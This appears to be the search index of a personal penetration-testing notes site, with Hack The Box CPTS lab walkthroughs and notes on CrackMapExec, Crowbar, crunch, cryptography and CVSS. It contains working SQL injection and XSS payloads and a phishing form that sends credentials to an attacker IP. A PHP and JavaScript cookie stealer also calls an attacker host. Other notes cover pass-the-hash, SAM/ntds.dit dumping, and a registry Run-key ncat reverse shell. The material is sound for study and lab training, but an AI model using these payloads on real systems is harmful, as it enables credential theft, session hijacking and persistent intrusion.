'user()'</p> <pre><code>' ORDER BY 1;#\n' ORDER BY 2;#\n' ORDER BY 3;#\n' ORDER BY 4;#\n' ORDER BY 5;#\n\n# With 5 columns it will return an error, so it has 4 columns\n\n# Check out which ones are printed with\n' UNION select 1,2,3,4;#\n\n# The UI will give you columns 2,3,4. Inject the code there\n' UNION select 1,user(),@@version,4;#\n</code></pre> <p>Results: root@localhost</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#exploitation","title":"Exploitation","text":"<p>What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?</p> <pre><code># This comes from the previous exercise...\n\n# Get all the columns from the table users\ncn' UNION select 1,column_name,3,4 from information_schema.columns WHERE table_name='users'-- -\n\n# Get id, username and password from table users:\ncn' UNION select 1,id,username,password from users-- -\n</code></pre> Port Code Port City Port Volume 1 admin 392037dbba51f692776d6cefb6dd546d 2 newuser 9da2c9bcdf39d8610954e0e11ea8f45f <p>Results:  9da2c9bcdf39d8610954e0e11ea8f45f</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#cross-site-scripting-xss","title":"Cross-Site Scripting (XSS)","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#xss-basics","title":"XSS Basics","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#stored-xss","title":"Stored XSS","text":"<p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</p> <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;\n</code></pre> <p>Results:  HTB{570r3d_f0r_3v3ry0n3_70_533}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#reflected-xss","title":"Reflected XSS","text":"<p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.</p> <pre><code>http://83.136.253.163:57837/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E\n</code></pre> <p>Results: HTB{r3fl3c73d_b4ck_2_m3}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#dom-xss","title":"DOM XSS","text":"<p>To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. \u00a0 <pre><code># Enter &lt;img src=\"\" onerror=alert(document.cookie)&gt;\n</code></pre></p> <p>Results: </p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#xss-discovery","title":"XSS Discovery","text":"<p>Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?</p> <pre><code># Enter http://$ip:$port/?fullname=lolo&amp;username=lala&amp;password=lalala&amp;email=%3Cscript%3Ealert(document.cookie)%3C/script%3E\n</code></pre> <p>Results: email</p> <p>What type of XSS was found on the above server? \"name only\"</p> <p>Results:  Reflected</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#xss-attacks","title":"XSS Attacks","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#phishing","title":"Phishing","text":"<p>Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.</p> <p>Creating a valid payload in http://10.129.148.221/phishing/index.php?url= This would be the payload:</p> <pre><code>\\`/'&lt;/script/--!&gt;&lt;h3&gt;Please login to continue&lt;/h3&gt;&lt;form action=http://10.10.14.198&gt;    &lt;input type=\"username\" name=\"username\" placeholder=\"Username\"&gt;&lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Login\"&gt;&lt;/form&gt;\n</code></pre> <p>This would be the link generated:</p> <pre><code>http://10.129.148.221/phishing/index.php?url=%5C%60%2F%27%3C%2Fscript%2F--%21%3E%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.198%3E++++%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E\n</code></pre> <p>Starting a netcat listener:</p> <pre><code>sudo nc -lvnp 80\n</code></pre> <p>Visiting http://10.129.148.221/phishing/send.php and entering the link generated.</p> <p>In the netcat  listener we obtain:</p> <pre><code>listening on [any] 80 ...\nconnect to [10.10.14.198] from (UNKNOWN) [10.129.148.221] 46802\nGET /?username=admin&amp;password=p1zd0nt57341myp455&amp;submit=Login HTTP/1.1\nHost: 10.10.14.198\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nUser-Agent: HTBXSS/1.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://10.129.148.221/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US\n</code></pre> <p>We use the creds for accessing to /phishing/login.php and grabbing the flag</p> <p>Results: HTB{r3f13c73d_cr3d5_84ck_2_m3}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#session-hijacking","title":"Session Hijacking","text":"<p>Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.</p> <p>Create a file index.php in the attacker machine:</p> <pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $list = explode(\";\", $_GET['c']);\n    foreach ($list as $key =&gt; $value) {\n        $cookie = urldecode($value);\n        $file = fopen(\"cookies.txt\", \"a+\");\n        fputs($file, \"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n\");\n        fclose($file);\n    }\n}\n?&gt;\n</code></pre> <p>Have a php server listening:</p> <pre><code>sudo php -S 0.0.0.0:80\n</code></pre> <p>Enter $ip/hijacking and enter this payload in every field. Use the field name (username, name, surname...) as <code>&lt;custom.name&gt;</code> when different payloads:</p> <pre><code>&lt;script&gt;document.location=%27http://attackerIP/index.php?c=%27+document.cookie&lt;/script&gt;\n</code></pre> <p>If successful, you will see a connection in your php server like this:</p> <p></p> <p>Then, <code>profile</code> would be the vulnerable input (parameter <code>imgurl</code>). The URL:</p> <pre><code>http://VICTIMIP/hijacking/?fullname=Lala%20lalasurname%2Ffullname%3C%2Fscript%3E&amp;username=%22%3E%3Cscript+src%3Dhttp%3A%2F%2FAttackerIP%2Fusername%3C%2Fscript%3E&amp;password=lala&amp;email=lala%40gmail.com&amp;imgurl=%22%3E%3Cscript%20src=%22http://AttackerIP/lala.js%22%3E%3C/script%3E\n</code></pre> <p>Beside the index.php, have a lala.js in your php server:</p> <pre><code>new Image().src='http://attackerIP/index.php?c='+document.cookie\n</code></pre> <p>Run your php server:</p> <pre><code>sudo php -S 0.0.0.0:80\n</code></pre> <p>Now, we can change the URL in the XSS payload we found earlier to use\u00a0<code>lala.js</code>. For instance:</p> <pre><code>&lt;script src=http://attackerIP/lala.js&gt;&lt;/script&gt;\n</code></pre> <p>You will log the following activity in your php server:</p> <p></p> <p>Results:  HTB{4lw4y5_53cur3_y0ur_c00k135}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#xss-prevention","title":"XSS Prevention","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#skills-assessment_4","title":"Skills Assessment","text":"<p>What is the value of the 'flag' cookie?</p> <p>Enter payload in all form fields. The vulnerable one is <code>website</code> with the payload</p> <pre><code>&lt;script src='http://attackerIP/website'&gt;&lt;/script&gt;\n</code></pre> <p>I have a php server running, with this index.php:</p> <pre><code>&lt;?php\nif (isset($_GET['c'])) {\n    $list = explode(\";\", $_GET['c']);\n    foreach ($list as $key =&gt; $value) {\n        $cookie = urldecode($value);\n        $file = fopen(\"cookies.txt\", \"a+\");\n        fputs($file, \"Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n\");\n        fclose($file);\n    }\n}\n?&gt;\n</code></pre> <p>I know that it is the parameter <code>webserver</code> because of this:</p> <p></p> <p>Now, I have also this file lala.js in my server:</p> <pre><code>&lt;script src='http://attackerIP/lala.js'&gt;&lt;/script&gt;\n</code></pre> <p>And in my php server:</p> <p></p> <p>Results:  HTB{cr055_5173_5cr1p71n6_n1nj4}</p>","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#file-inclusion","title":"File Inclusion","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#file-upload-attacks","title":"File Upload Attacks","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#command-injections","title":"Command Injections","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#web-attacks","title":"Web Attacks","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#attacking-common-applications","title":"Attacking Common Applications","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#linux-privilege-escalation","title":"Linux Privilege Escalation","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#windows-privilege-escalation","title":"Windows Privilege Escalation","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#documentation-reporting","title":"Documentation &amp; Reporting","text":"","tags":["certification","CPTS","labs"]},{"location":"cpts-labs/#attacking-enterprise-networks","title":"Attacking Enterprise Networks","text":"<p>Question</p> <p>Results: </p>","tags":["certification","CPTS","labs"]},{"location":"crackmapexec/","title":"CrackMapExec","text":"<p>Once we have access to a domain, CrackMapExec (CME) will allow us to sweep the network and see which users and machines we can access to.</p> <p>CME allows us to authenticate ourselves with the following protocols:</p> <ul> <li>smb</li> <li>ssh</li> <li>mssql</li> <li>ldap</li> <li>winrm</li> </ul> <p>The most used protocol is smb as port 445 is commonly open.</p> <p>CME offers a help menu for each protocol (i.e.,\u00a0<code>crackmapexec winrm -h</code>). </p>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#installation","title":"Installation","text":"<pre><code>sudo apt-get -y install crackmapexec\n</code></pre>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#basic-usage","title":"Basic usage","text":"<p>Main syntax</p> <pre><code>crackmapexec &lt;protocol&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;\n</code></pre> <p>Main flags:</p> <ul> <li>-u Username\u00a0<code>The user whose credentials we will use to authenticate</code></li> <li>-p Password\u00a0<code>User's password</code></li> <li>Target (IP or FQDN)\u00a0<code>Target host to enumerate</code>\u00a0(in our case, the Domain Controller)</li> <li>--users\u00a0<code>Specifies to enumerate Domain Users</code></li> <li>--groups\u00a0<code>Specifies to enumerate domain groups</code></li> <li>--loggedon-users\u00a0<code>Attempts to enumerate what users are logged on to a target, if any</code></li> </ul>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#access-the-machine","title":"Access the machine","text":"<pre><code># Check if we can access a machine\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt;\n\n# Using a hash instead of a password, to authenticate ourselves: Pass the hash attack (PtH)\ncrackmapexec smb $ip -u &lt;username&gt; -H &lt;hash&gt; -d &lt;DOMAIN&gt;\n</code></pre>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#basic-enumeration","title":"Basic enumeration","text":"<pre><code># Enumerate active sessions\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --sessions\n\n# Obtain the password policy\ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; --pass-pol\n\n\n# Spraying password with crackmapexec\ncrackmapexec smb $ip/23 -u /folder/userlist.txt -u administrator -H 88ad09182de639ccc6579eb0849751cf --local-auth --continue-on-success | grep +\n# --continue-on-success:  continue spraying even after a valid password is found. Useful for spraying a single password against a large user list\n# --local-auth:  if we are targetting a non-domain joined computer, we will need to use the option --local-auth. The --local-auth flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.\n# -H: hash\n\n# Get sam: extract hashes from all users authenticated in the machine \ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --sam\n\n# Get the ntds.dit, given that your user has permissions\ncrackmapexec smb $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --ntds\n\n# Check which machines we can access in a subnet\ncrackmapexec smb $ip/24 -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt;\n\n# Enumerate logged on users in other hosts of the domain\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --loggedon-users\n\n# Enumerate users of the domain\nsudo crackmapexec smb  $ip -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --users\n\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --users\n\n# Enumerate groups of the domain\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --groups\n</code></pre>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#enumerate-shares","title":"Enumerate shares","text":"<pre><code># See shares\ncrackmapexec smb $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; --shares\n\n# The module spider_plus will dig through each readable share on the host and list all readable files. \nsudo crackmapexec smb  $ip --local-auth -u &lt;username&gt; -p &lt;password&gt; -d &lt;DOMAIN&gt; -M spider_plus --share 'NameOfShare'\n# CME writes the results to a JSON file located at /tmp/cme_spider_plus/&lt;ip of host&gt;\n</code></pre>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#rce-with-crackmapexec","title":"RCE with crackmapexec","text":"<pre><code>#  If the--exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec.\ncrackmapexec smb $ip -u Administrator -p '&lt;password&gt;' -x 'whoami' --exec-method smbexec\n</code></pre>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#basic-technique","title":"Basic technique","text":"<p>Once we have access to  a domain:</p> <ol> <li> <p>Enumerate users and machines in our machine: we will have all users registered and their hashes. </p> </li> <li> <p>See if any user is in another machine of the domain. Also check if they have admin access.</p> </li> <li> <p>Goal would be to dump ntds.dit.</p> </li> </ol> <p>With krbtgt and DC$ user you can get a golden ticket. And with DC$ a silver ticket.</p>","tags":["windows","dump hashes","passwords"]},{"location":"crackmapexec/#what-is-a-sam-hash-like","title":"What is a SAM hash like?","text":"<p>Take the Administrator one:</p> <pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre> <p>Basically, it has 4 parts: </p> <pre><code>                user : id: LM-authentication : NTLM\n</code></pre> <p>For the purpose of using the hash with CrackMapExec, we will user the NTLM part.</p>","tags":["windows","dump hashes","passwords"]},{"location":"crawlers/","title":"Crawlers","text":"","tags":["tools","crawler"]},{"location":"crawlers/#scrapy","title":"Scrapy","text":"","tags":["tools","crawler"]},{"location":"crawlers/#installation","title":"Installation","text":"<pre><code>pip3 install scrapy\n</code></pre>","tags":["tools","crawler"]},{"location":"crawlers/#reconspider","title":"ReconSpider","text":"","tags":["tools","crawler"]},{"location":"crawlers/#installation_1","title":"Installation","text":"<pre><code>wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip\n\nunzip ReconSpider.zip \n</code></pre>","tags":["tools","crawler"]},{"location":"crawlers/#basic-usage","title":"Basic usage","text":"<pre><code>python3 ReconSpider.py http://domain.com\n</code></pre>","tags":["tools","crawler"]},{"location":"create-a-registry/","title":"Create a Registry","text":"<p>Registries in the victim machine may be used to save a connection to the attacker machine.</p>","tags":["privilege escalation"]},{"location":"create-a-registry/#regedit","title":"Regedit","text":"<pre><code>Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nRight-Button &gt; New &gt; String value\n\nWe name it exactly like the ncat.exe file (if we renamed it to winconfig, then we call this registry winconfig&gt;\n\nWe edit the registry and we add the path to the executable file and some commands\u00a0 in the Value data:\n\n\u201cC:\\Windows/System32\\winconfig.exe &lt;attacker IP&gt; &lt;port&gt; -e cmd.exe\u201d\n\nFor instance: \u201cC:\\Windows/System32\\winconfig.exe 192.168.1.50 5540 -e cmd.exe\u201d\n</code></pre>","tags":["privilege escalation"]},{"location":"create-a-registry/#python-script-that-add-a-binary-to-the-registry","title":"Python script that add a binary to the Registry","text":"<p>See Making your binary persistent</p>","tags":["privilege escalation"]},{"location":"cron-jobs/","title":"Cron jobs","text":"<p>In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. The equivalent in Windows would be a Scheduled task. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them:</p> <p>1.  /etc/crontab</p> <p>2.  /etc/cron.d</p> <p>3. /var/spool/cron/crontabs/root</p> <p>Basically, the principle behind this technique is:</p> <ul> <li>writing to a directory called by a cron job, </li> <li>and include a bash script with a reverse shell command,</li> <li>which should send us a reverse shell when executed.</li> </ul>","tags":["pentesting","privilege escalation","linux"]},{"location":"crowbar/","title":"Crowbar","text":"<p>Crowbar (formally known as Levye)\u00a0is a brute forcing tool that can be used during penetration tests. It was developed to brute force some protocols in a different manner according to other popular brute forcing tools.</p>","tags":["pentesting","brute","forcing","windows","passwords"]},{"location":"crowbar/#installation","title":"Installation","text":"<p>Repo: https://github.com/galkan/crowbar</p> <pre><code>git clone https://github.com/galkan/crowbar\ncd crowbar/\npip3 install -r requirements.txt\n</code></pre>","tags":["pentesting","brute","forcing","windows","passwords"]},{"location":"crowbar/#basic-commands","title":"Basic commands","text":"<pre><code>crowbar -b rdp -s $ip/32 -U users.txt -c 'password123'\n</code></pre>","tags":["pentesting","brute","forcing","windows","passwords"]},{"location":"crunch/","title":"crunch - A dictionary generator","text":"<p>Crunch generates combinations of words and manglings to be used later off as attacking dictionaries.</p>","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"crunch/#installation","title":"Installation","text":"<p>Preinstalled in kali linux. To install:</p> <pre><code>sudo apt install crunch\n</code></pre>","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"crunch/#basic-commands","title":"Basic commands","text":"<pre><code># Generates words from &lt;number1&gt; to &lt;number2&gt; with the specified characters.\ncrunch &lt;number1&gt; &lt;number2&gt; &lt;characters&gt; -o file.txt\n# &lt;number1&gt;: minimum of characters that password has\n# &lt;number2&gt;: maximum of characters that password has\n# &lt;characters&gt;: those characters included in the set\n# -o: Send output to file.txt\n# There exists more flags\n</code></pre>","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"crunch/#resources","title":"Resources","text":"<ul> <li>Advanced crunch: https://secf00tprint.github.io/blog/passwords/crunch/advanced/en.</li> </ul>","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"cryptography/","title":"Cryptography","text":"","tags":["crytography"]},{"location":"cryptography/#encryption-technologies","title":"Encryption Technologies","text":"Encryption Technology Description <code>UNIX crypt(3)</code> Crypt(3) is a traditional UNIX encryption system with a 56-bit key. <code>Traditional DES-based</code> DES-based encryption uses the Data Encryption Standard algorithm to encrypt data. <code>bigcrypt</code> Bigcrypt is an extension of traditional DES-based encryption. It uses a 128-bit key. <code>BSDI extended DES-based</code> BSDI extended DES-based encryption is an extension of the traditional DES-based encryption and uses a 168-bit key. <code>FreeBSD MD5-based</code> (Linux &amp; Cisco) FreeBSD MD5-based encryption uses the MD5 algorithm to encrypt data with a 128-bit key. <code>OpenBSD Blowfish-based</code> OpenBSD Blowfish-based encryption uses the Blowfish algorithm to encrypt data with a 448-bit key. <code>Kerberos/AFS</code> Kerberos and AFS are authentication systems that use encryption to ensure secure entity communication. <code>Windows LM</code> Windows LM encryption uses the Data Encryption Standard algorithm to encrypt data with a 56-bit key. <code>DES-based tripcodes</code> DES-based tripcodes are used to authenticate users based on the Data Encryption Standard algorithm. <code>SHA-crypt hashes</code> SHA-crypt hashes are used to encrypt data with a 256-bit key and are available in newer versions of Fedora and Ubuntu. <code>SHA-crypt</code> and <code>SUNMD5 hashes</code> (Solaris) SHA-crypt and SUNMD5 hashes use the SHA-crypt and MD5 algorithms to encrypt data with a 256-bit key and are available in Solaris. <code>...</code> and many more.","tags":["crytography"]},{"location":"cryptography/#symmetric-encryption","title":"Symmetric Encryption","text":"<p>There is only a shared secret key</p>","tags":["crytography"]},{"location":"cryptography/#asymmetric-pki-encryption","title":"Asymmetric PKI Encryption","text":"<p>There is a public and a private key.</p>","tags":["crytography"]},{"location":"cryptography/#digital-certificate","title":"Digital certificate","text":"<p>A digital certificate is an electronic document used to identify an individual, a sercer, an organization, or some other entity and associate that entity with a public key.</p> <p>Digital certificates are used in PKI public key infraestructure encryption. We can thing of a digital certificate as our \"online\" digital credential that verifies our identity.</p> <p>Digital certificates are issued by Certificate Authorities (CA). </p>","tags":["crytography"]},{"location":"cryptography/#emails","title":"Emails","text":"<p>Symmetric and asymmetric encryption don't guarantee Integrity, Authentication or Non-Repudiation. They only guarantee Confidentiality. </p> <p>To achieve Integrity, Authentication and Non-Repudiation, emails use a digital signature.</p>","tags":["crytography"]},{"location":"cryptography/#windows-encrypted-file-system","title":"Windows Encrypted File System","text":"<p>Windows Encrypted File System (EFS) allows us to encrypt individual files and folders. Bit Locker, on the other hand, is full disk encryption.</p> <p>Windows encryption uses a combination of symmetric and asymmetric encryption whereas:</p> <ul> <li>A separate symmetric secret key is created for each file.</li> <li>A digital certificate is created for the user, which holds the user's private and public pair.</li> </ul> <p></p> <p>If the user's digital certificate is deleted or lost, encrypted files and folders can only be decrypted with a Windows Recovery Agent.</p> <p>Let's how it's decrypted: </p> <p></p> <p>Software based encryption: uses software tools to encrypt data: bitlocker, windows EFS, Veracrypt, 7zip.</p>","tags":["crytography"]},{"location":"cryptography/#cipher-block-chaining-cbc","title":"Cipher block chaining (CBC)","text":"<p>Source: wikipedia</p> <p></p> <p></p>","tags":["crytography"]},{"location":"ctr/","title":"ctr.sh","text":"<p>It collects information about SSL certificates. If you visit a domain and it contains a certificate you can extract other subdomain by using the View Certificate functionality.</p>","tags":["scanning","domain","subdomain","reconnaissance","tools"]},{"location":"ctr/#usage","title":"Usage","text":"<p>In your browser, go to:</p> <p>https://crt.sh/</p>","tags":["scanning","domain","subdomain","reconnaissance","tools"]},{"location":"cupp-common-user-password-profiler/","title":"CUPP - Common User Password Profiler","text":"<p>This Common User Password Profiler tool (CUPP) generates a dictionary based on the input that you introduce when asked for names, dates, places... </p>","tags":["web pentesting","enumeration","tools","dictionary","dictionary generator"]},{"location":"cupp-common-user-password-profiler/#installation","title":"Installation","text":"<p>Github repo: https://github.com/Mebus/cupp.</p>","tags":["web pentesting","enumeration","tools","dictionary","dictionary generator"]},{"location":"cupp-common-user-password-profiler/#basic-commands","title":"Basic commands","text":"<pre><code>python cupp.py &lt;flag options&gt;\n#    -i      Interactive questions for user password profiling\n#    -w      Use this option to profile existing dictionary, or WyD.pl output to make some pwnsauce :)\n#    -l      Download huge wordlists from repository\n#    -a      Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified databases of Phenoelit and CIRT which where merged and enhanced.\n#    -v      Version of the program\n</code></pre>","tags":["web pentesting","enumeration","tools","dictionary","dictionary generator"]},{"location":"curl/","title":"curl","text":"","tags":["bash","tools","pentesting"]},{"location":"curl/#basic-usage","title":"Basic usage","text":"<pre><code>curl -i -L $host -v\n# -L: Follow redirections\n# -i: Include headers in the response \n# -v: verbose\n\ncurl -T file.txt\n# -T, --upload-file &lt;file&gt;; This transfers the specified local file to the remote URL. -T uses PUT http method\n\ncurl -o target/path/filename URL\n# -o: to specify a location/filename\n\n# Upload a File\ncurl -F \"Filedata=@./shellsample.php\" URL\n\n# Sends a GET request\ncurl -X GET $ip\n\n# Sends a HEAD request\ncurl -l  $ip\n\n# Sends a OPTIONS request\ncurl -X OPTIONS  $ip\n\n# Sends a POST request with parameters name and password in the body data\ncurl -X POST  $ip -d \"name=username&amp;password=password\" -v\n\n# Upload a file with a PUT method\ncurl $ip/uploads/ --upload-file hello.txt\n\ncurl -XDELETE $ip/uploads/hello.txt\n# Delete a file\n</code></pre>","tags":["bash","tools","pentesting"]},{"location":"cve-common-vulnerabilities-and-exposures/","title":"cve","text":"<p>Common Vulnerabilities and Exposures (CVE) is a publicly available catalog of security issues sponsored by the United States Department of Homeland Security (DHS).</p> <p>Each security issue has a unique CVE ID number assigned by the CVE Numbering Authority (CNA). The purpose of creating a unique CVE ID number is to create a standardization for a vulnerability or exposure as a researcher identifies it.</p>"},{"location":"cve-common-vulnerabilities-and-exposures/#stages-of-obtaining-a-cve","title":"Stages of Obtaining a CVE","text":"<p>Stage 1: Identify if CVE is Required and Relevant.</p> <p>Stage 2: Reach Out to Affected Product Vendor.</p> <p>Stage 3: Identify if Request Should Be For Vendor CNA or Third Party CNA.</p> <p>Stage 4: Requesting CVE ID Through CVE Web Form.</p> <p>Stage 5: Confirmation of CVE Form.</p> <p>Stage 6: Receival of CVE ID.</p> <p>Stage 7: Public Disclosure of CVE ID.</p> <p>Stage 8: Announcing the CVE.</p> <p>Stage 9: Providing Information to The CVE Team.</p> <p>If an issue is not responsibly disclosed to a vendor, real threat actors may be able to leverage the issues for criminal use, also referred to as a zero day or an 0-day.</p>"},{"location":"cvss-common-vulnerability-scoring-system/","title":"Common Vulnerability Scoring System","text":"<p> <code>Source:  Hack The Box Academy</code></p> <p>The Common Vulnerability Scoring System (CVSS) is a framework for rating the severity of software vulnerabilities in an objective way. For that it uses standarized vendor and platform agnostic vulnerability scoring methodologies.</p> <p>Scores ranges from 0.0 to 10.0 (being the most severe):</p> <ul> <li>Low: 0.1-3.9.</li> <li>Medium: 4.0-6.9 </li> <li>High: 7.0-8.9</li> <li>Critical: 9.0-10.00</li> </ul> <p>CVSS uses a combination of base, temporal, and environmental metrics</p> <p>CVSS is not a risk rating framework (for that you have OWASP, for instance); typical out of scope impact: number of customer on a product line, monetary losses due to a breach, ....</p> <p>There are three basic vectors: Basic metric group, temporal metric group and Environmental metric group. </p> <p>The way to quote a CVSS scoring is adding also their vector.</p>","tags":["cvss"]},{"location":"cvss-common-vulnerability-scoring-system/#metric-groups","title":"Metric groups","text":"<p>Base score reflects the severity of a vulnerability according to ist intrinsic characteristic which are constant over time and assumes the reasonable worst case impact across different deployed environments:</p> <ul> <li> <p>Exploitability metrics: The Exploitability metrics are a way to evaluate the technical means needed to exploit the issue.</p> <ul> <li> <p>Attack vector (AV): </p> <ul> <li>Network (N attack where there is rooter in place), </li> <li>Adjacent (A attack is launched from the same network segment, VPN included), </li> <li>Local (L attacker can login locally into the system), </li> <li>Physical (P the attacker needs to be physically present).</li> </ul> </li> <li> <p>Attack Complexity (AC): Conditions that should be present in order for the attack to exists.</p> <ul> <li>Low (L): there is not specialized access conditions to perform the attack.</li> <li>High (H): attacker should invest or prepare somehow before an attack (for instance, gathering knowledge about configurations or setup software or licenses)</li> </ul> </li> <li> <p>Privileged Required (PR):  </p> <ul> <li>None (N): The attacker is unauthorize prior to attack</li> <li>Low (L): Attacker should have user level access.</li> <li>High (H): Privileges that provide significant control over the vulnerable component.</li> </ul> </li> <li> <p>User Interaction (UI): Need user participation.</p> <ul> <li>None (N): Attack can be perform without any action from user side.</li> <li>Required (R): Somebody has to visit the page and click it. </li> </ul> </li> </ul> </li> <li> <p>Scope: what component is impacted by the vulnerability. Whether a vulnerability in one vulnerable component impacts resources in components beyond its security scope. If the scope is C, then IMPACT needs to be revaluated.</p> <ul> <li>Changed (C): the exploited vulnerability affects resources managed by different security authority.</li> <li>Unchanged (U): the exploited vulnerability can only affect resources managed by the same security authority.</li> </ul> </li> <li> <p>Impact metrics: CIA. The Impact metrics represent the repercussions of successfully exploiting an issue and what is impacted in an environment, and it is based on the CIA triad.</p> <ul> <li> <p>Confidentiality (C): Impact to the confidentiality if the information resources are accessed.</p> <ul> <li>None (N):  None data revealed.</li> <li>Low (L): Some data is accessed. But it has not impact.</li> <li>High (H): Total loss of confidentiality. Access to restricted information is obtained, and disclosed information is critical.</li> </ul> </li> <li> <p>Integrity (I):</p> <ul> <li>None (N):</li> <li>Low (L):</li> <li>High (H):</li> </ul> </li> <li> <p>Availability (A):</p> <ul> <li>None (N):</li> <li>Low (L):</li> <li>High (H):</li> </ul> </li> </ul> </li> </ul> <p>Temporal metric group: the characteristics of a vulnerability that may change over time but not across user environments. </p> <ul> <li> <p>Exploit Code Maturity (E) metric represents the probability of an issue being exploited based on ease of exploitation techniques.</p> <ul> <li><code>Not Defined</code></li> <li><code>High</code></li> <li><code>Functional</code></li> <li><code>Proof-of-Concept</code></li> <li><code>Unproven</code>.</li> </ul> </li> <li> <p>Remediation Level (RL)  is used to identify the prioritization of a vulnerability.</p> <ul> <li><code>Not Defined</code></li> <li><code>Unavailable</code></li> <li><code>Workaround</code></li> <li><code>Temporary Fix</code></li> <li><code>Official Fix</code></li> </ul> </li> <li> <p>Report Confidence (RC) represents the validation of the vulnerability and how accurate the technical details of the issue are.</p> <ul> <li><code>Not Defined</code></li> <li><code>Confirmed</code></li> <li><code>Reasonable</code></li> <li><code>Unknown</code></li> </ul> </li> </ul> <p>Environmet metric group: the characteristics of a vulneravbility that are relevant and unique to a particular user's environment. </p> <ul> <li>Env (CR, IA, ...)</li> </ul> <p>All metrics are scored under the assumption that the attacker has already located and identified the vulnerability. Analyst need to consider the means by which the vulnerability was identified or difficulty to identify the vulnerability.</p>","tags":["cvss"]},{"location":"cvss-common-vulnerability-scoring-system/#cvss-calculator","title":"cvss Calculator","text":"<p>nist 